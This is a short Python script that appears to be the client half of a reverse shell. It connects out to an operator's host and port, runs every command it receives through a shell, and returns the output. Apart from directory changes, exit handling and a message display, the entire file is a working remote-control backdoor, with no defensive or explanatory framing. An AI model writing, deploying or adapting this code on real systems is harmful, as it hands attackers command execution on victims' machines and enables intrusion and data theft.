import socket
import subprocess
import os
import sys

def session_handler():
    print(f'[+] Connecting to {host_ip}.')
    sock.connect((host_ip, host_port))
    print(f'[+] Connected to {host_ip}.')
    
    while True:
        try:
            message = inbound()
            # exit handling
            if message == 'exit':
                print("[-] The server has terminated connection")
                sock.close()
                break
            #######################
            # Change directory handling
            #######################
            elif message.split(" ")[0] == 'cd':
                try:
                    directory = str(message.split(" ") [1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f'[+] Changed to {cur_dir}')
                    sock.send(cur_dir.encode())
                except FileNotFoundError:
                    outbound('Invalid Directory. Try again.')
                    continue
            #######################
            # Display Ascii Message
            #######################
            elif message.split(" ")[0] == 'Message':
                print(message)
                sock.send("Confirmation".encode())
            #######################
            # Basic Command handling
            #######################
            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                sock.send(output)
       
            ####
            # Catch and print failures
            ####
        except Exception as fail:
            print(f"[-] Closing ... Exception caught {fail}")
            sock.close()
            break
        

def inbound():
    print('[+] Awaiting response...')
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            return message
        except Exception as fail:
            print(f"[-] Closing ... Exception caught {fail}")
            outbound(fail)
            sock.close()
            break

def outbound(message):
    response = str(message).encode()
    sock.send(response)



if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    host_ip = sys.argv[1]
    host_port = int(sys.argv[2])

    # call session_handler
    #
    session_handler()
